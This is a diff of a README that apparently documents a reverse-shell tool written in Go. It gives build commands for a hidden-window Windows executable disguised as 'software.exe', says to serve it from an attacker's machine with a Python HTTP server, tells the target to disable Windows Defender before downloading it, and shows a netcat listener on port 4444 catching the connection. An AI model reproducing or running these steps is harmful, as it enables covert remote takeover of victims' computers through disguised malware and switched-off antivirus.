@@ -42,11 +42,14 @@ can be used for gain access into machines you don't have permissions. Please, al
   
  Next that, compile with :
  
-  >  GOOS=windows GOARCH=amd64 go build -dflags="-H windowsgui -s -W" -o software.exe reverse_shell.go 
+ 
+  >  GOOS=windows GOARCH=amd64 go build -dflags="-H windowsgui -s -W" -o software.exe payload.go
+   
  
 🚫 If compile give any error, try :
 
-  >  GOOS=windows GOARCH=amd64 go build -ldflags="-H windowsgui -s -w" -o software.exe reverse_shell.go "
+
+  >  GOOS=windows GOARCH=amd64 go build -ldflags="-H windowsgui -s -w" -o software.exe payload.go
  
 --------------------------------------------------------------------------------------------------------------------------------------------------------------
 
@@ -56,6 +59,7 @@ can be used for gain access into machines you don't have permissions. Please, al
  
   > python3 --version
   
+  
   expected output : 
 
 
@@ -64,33 +68,47 @@ can be used for gain access into machines you don't have permissions. Please, al
   
   Then, Make a temporal server.
   
+  
   > python3 -m http.server 8000
   
   expected output : >
+  
 
                     Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 
- The target machine must open web browser and type 
+ The target machine must open web browser and type:
+  
 
   > http://attacker_machine_ip:8000
+  
 
- Then just disable win defender and download the previous compiled *software.exe*
+ just disable win defender and download the previous compiled *software.exe*
 
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-😈 Final attack 
+😈 Final attack
+ 
 
  Start to listen with nc in the port 4444
 
+
   > sudo nc -lvnp 4444
+
 
   expected output : 
 
+
   > Listening on 0.0.0.0 4444
+
 
  Just double click on software.exe in target machine and...
 
+
 ✅ Conection stablished
+
+
+Watch the demo in **demo.mp4**
+
  
 📹 see demo in **demo.mp4** 
 
